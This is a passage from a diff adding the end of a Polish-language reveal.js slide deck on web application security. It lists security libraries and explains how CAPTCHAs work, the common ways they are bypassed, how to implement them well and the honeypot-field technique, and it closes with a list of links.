+</dd>
+
+<dt><b>OACC (<a href="http://oaccframework.org/">http://oaccframework.org/</a>)</b></dt><dd>authorization
+</dd>
+</dl>
+</section>
+<section id="sec-9-27" >
+
+<h3>Biblioteki "bezpieczeństwa"</h3>
+<p>
+Biblioteki dostarczające mechanizmy pomagające redukować ryzyko
+związane z atakami na aplikacji webowe:
+</p>
+<dl class="org-dl">
+<dt><b>HDIV (<a href="http://www.hdiv.org">http://www.hdiv.org</a>)</b></dt><dd>Aktywnie rozwijana, pokrywa OWASP Top
+10, integruje się z kilkoma dużymi frameworkami (Spring, Struts,
+Grails, JSF itp)
+</dd>
+<dt><b>ESAPI (<a href="https://code.google.com/p/owasp-esapi-java/">https://code.google.com/p/owasp-esapi-java/</a>)</b></dt><dd>Biblioteka
+dostarczana przez OWASP, jednakże jest rozwój został wstrzymany
+</dd>
+</dl>
+</section>
+</section>
+<section>
+<section id="sec-10" >
+
+<h2>CAPTCHA</h2>
+</section>
+<section id="sec-10-1" >
+
+<h3>Nazwa</h3>
+<pre class="example">
+C ompletely 
+A utomated 
+P ublic 
+T uring test to tell 
+C omputers and 
+H umans 
+A part
+</pre>
+</section>
+<section id="sec-10-2" >
+
+<h3>Zastosowanie</h3>
+<p>
+CAPTCHA-e mają szerokie zastosowanie przy poprawie różnych aspektów
+bezpieczeństwa aplikacji. Pomagają zapobiegać:
+</p>
+<ul class="org-ul">
+<li>atakom słownikom przy formularzach logowania i odzyskiwania hasła
+</li>
+<li>spamowaniu na blogach i forach
+</li>
+<li>wykorzystaniu naszych zasobów przez skrypty czy backend-y innych
+aplikacji (formularze ubezpieczeniowe, usługi typu whois, bramki
+sms)
+</li>
+<li>limitowanie ruchu w naszych usługach (za duża ilość maili wysłana z
+jednego adresu)
+</li>
+<li>automatom które chciałyby wpłynąć na sondy, głosowania, wybory
+</li>
+<li>robotom które chcą się rejestrować na forach, tworzyć maile itp
+</li>
+</ul>
+</section>
+<section id="sec-10-3" >
+
+<h3>Typy</h3>
+<dl class="org-dl">
+<dt><b>Tekstowe</b></dt><dd>Przepisz tekst z obrazka lub zdjęcia
+</dd>
+<dt><b>Zadanie</b></dt><dd>Rozwiąż proste równanie (12-7=?) lub powiedz jaka pora
+roku jest po zimie
+</dd>
+<dt><b>Audio</b></dt><dd>wpisz tekst z pliku dźwiękowego
+</dd>
+</dl>
+
+</section>
+<section>
+
+<dl class="org-dl">
+<dt><b>Graficzne</b></dt><dd>Wskaż kota na obrazku, ustaw suwak filtra graficznego w
+miejscu gdzie obraz jest najmniej zniekształcony
+</dd>
+<dt><b>Video</b></dt><dd>Przepisz animowany tekst
+</dd>
+<dt><b>Skryptowe</b></dt><dd>Działają w przeglądarce, proszą o wykonanie prostej
+akcji (przeciągnij kwadrat na zielone pole),
+jednocześnie analizując ruch myszy
+</dd>
+</dl>
+</section>
+<section id="sec-10-4" >
+
+<h3>Ataki na CAPTCHA-e</h3>
+<dl class="org-dl">
+<dt><b>Słabość konkretnej implementacji</b></dt><dd>Niektóre implementacje CAPTCHA
+można obejść wykorzystując słabości ich implementacji:
+<ul class="org-ul">
+<li>brak losowości, zbudowanie słownika testów (np obrazków) z
+przypisanymi na stałe rozwiązaniami i captchaID
+</li>
+<li>skończona ilość rozwiązań (baza testów)
+</li>
+<li>zbyt proste rozwiązania (za mała ilość znaków) lub rozwiązania są
+wyrazami ze słownika
+</li>
+<li>możliwość wielokrotnego użycia sesji w którym raz poprawnie
+rozwiązano CAPTCHA-ę
+</li>
+<li>captcha-e generowane po stronie klienta - mimo, że walidowane po
+stronie serwera, to można podejrzeć dane na podstawie których
+generowały testowy obrazek
+</li>
+<li>walidacja po stronie klienta, nawet jeśli rozwiązanie jest podane
+jako hash (MD5)
+</li>
+<li>przekazywanie dodatkowych parametrów które mogą wskazywać na
+rozwiązanie
+</li>
+</ul>
+</dd>
+</dl>
+
+</section>
+<section>
+
+<dl class="org-dl">
+<dt><b>OCR</b></dt><dd>Tekstowe captcha-e które zawierają zbyt mało szumu i
+zniekształceń mogą zostać rozwiązane przez oprogramowanie OCR
+lub inne działające na zasadzie analizy obrazów
+</dd>
+
+<dt><b>Podstawienie (CAPTCHA Proxy)</b></dt><dd>Czasami serwis który oferuje
+pozornie ciekawa treść dla użytkowników (np.filmy, muzyka) prosi
+o rozwiązanie testu, który pochodzi z zupełnie innego serwisu
+</dd>
+
+<dt><b>Ludzie (CAPTCHA drones)</b></dt><dd>Istnieje możliwość zamówienia rozwiązania
+pakietu CAPTCHA przez ludzi (kilka $ za 1000 rozwiązanych testów)
+</dd>
+</dl>
+</section>
+<section id="sec-10-5" >
+
+<h3>Dostępne implementacje</h3>
+<dl class="org-dl">
+<dt><b>reCAPTCHA <a href="http://recaptcha.net">http://recaptcha.net</a></b></dt><dd>Obecnie chyba najpopularniejsza,
+dostarczana jako usługa, "pomaga światu"
+</dd>
+<dt><b>Jcaptcha <a href="http://jcaptcha.sourceforge.net">http://jcaptcha.sourceforge.net</a></b></dt><dd>Biblioteka do
+generowania obrazków i testów audio. Nierozwijana od 2012r.
+</dd>
+<dt><b>SimpleCaptcha <a href="http://simplecaptcha.sourceforge.net/">http://simplecaptcha.sourceforge.net/</a></b></dt><dd>Obrazki i
+audio. Nierozwijana od 2013r.
+</dd>
+<dt><b>Kaptcha <a href="https://code.google.com/p/kaptcha">https://code.google.com/p/kaptcha</a></b></dt><dd>Nierozwijana od 2010r.
+</dd>
+<dt><b>Cage <a href="https://akiraly.github.io/cage">https://akiraly.github.io/cage</a></b></dt><dd>Nierozwijana od 2011r.
+</dd>
+<dt><b>BotDetect <a href="https://captcha.com/java-captcha.html">https://captcha.com/java-captcha.html</a></b></dt><dd>Aktywnie
+rozwijana, płatna
+</dd>
+</dl>
+</section>
+<section id="sec-10-6" >
+
+<h3>Poprawna implementacja</h3>
+<ul class="org-ul">
+<li>Captcha powinna być rozwiązywalna dla człowieka, nie powodując przy
+tym irytacji, jednakże nie może być zbyt prosta
+</li>
+<li>Jeśli nasz test polega na generowaniu zniekształconych tekstów,
+powinna być możliwość wygenerowania innego obrazka w ramach tej
+samej sesji
+</li>
+<li>Dobrze jest zaoferować alternatywny sposób uwierzytelnienia (inny
+rodzaj CAPTCHA-y, wysłanie SMSa z kodem itp)
+</li>
+<li>Generując obrazki warto zredukować alfabet pod kątem podobnych
+znaków: <code>O</code> i <code>0</code>, <code>1</code> i <code>l</code>
+</li>
+<li>Weryfikując rozwiązania lepiej nie bazować na wielkości znaków
+</li>
+</ul>
+</section>
+<section id="sec-10-7" >
+
+<h3>Honeypot Captcha (Invisible Captcha)</h3>
+<p>
+Ciekawy trick pozwalający odfiltrować request-y
+pochodzące od spam-botów ("captcha bez captcha-y").
+</p>
+
+<ul class="org-ul">
+<li>Roboty spamujące fora i systemy komentarzy z reguły nie interpretują
+CSS i JS
+</li>
+<li>W formularzu do wysłania komentarza umieszczamy dodatkowe pole,
+które może mieć ciekawą nazwę jak "message" czy "comment"
+</li>
+<li>Używając CSS-a ukrywamy to pole (np: <code>display: none</code> albo
+modyfikując rozmiar i położenie)
+</li>
+<li>Na serwerze dodajemy filtr/interceptor/walidację pod kątem naszego
+ukrytego pola
+</li>
+<li>Odrzucamy każdy request który dostarczył wartość dla naszej
+"przynęty"
+</li>
+<li>Można też zwrócić poprawny kod (200), tak by wyglądało, że request
+został zaakceptowany
+</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="sec-11" >
+
+<h2>Linki, materiały</h2>
+<ul class="org-ul">
+<li><a href="https://www.owasp.org/">https://www.owasp.org/</a>
+</li>
+<li><a href="http://niebezpiecznik.pl">http://niebezpiecznik.pl</a>
+</li>
+<li><a href="http://securitum.pl">http://securitum.pl</a>
+</li>
+<li><a href="http://sekurak.pl">http://sekurak.pl</a>
+</li>
+<li><a href="https://zaufanatrzeciastrona.pl/">https://zaufanatrzeciastrona.pl/</a>
+</li>
+<li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">http://www.html5rocks.com/en/tutorials/security/content-security-policy/</a>
+</li>
+<li><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a>
+</li>
+</ul>
+</section>
+</section>
+</div>
+</div>
+
+<script src="file:////home/marcin/.emacs.d/libs/reveal.js/lib/js/head.min.js"></script>
+<script src="file:////home/marcin/.emacs.d/libs/reveal.js/js/reveal.min.js"></script>
+
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+
+controls: true,
+progress: true,
+history: false,
+center: true,
+slideNumber: true,
+rollingLinks: true,
+keyboard: true,
+overview: true,
+width: 1200,
+height: 600,
+
+theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+transition: Reveal.getQueryHash().transition || 'linear', // default/cube/page/concave/zoom/linear/fade/none
+transitionSpeed: 'default',
+
+// Optional libraries used to extend on reveal.js
+dependencies: [
+ { src: 'file:////home/marcin/.emacs.d/libs/reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+ { src: 'file:////home/marcin/.emacs.d/libs/reveal.js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+ { src: 'file:////home/marcin/.emacs.d/libs/reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+ { src: 'file:////home/marcin/.emacs.d/libs/reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+ { src: 'file:////home/marcin/.emacs.d/libs/reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+ { src: 'file:////home/marcin/.emacs.d/libs/reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+]
+});
+</script>
+</body>
+</html>
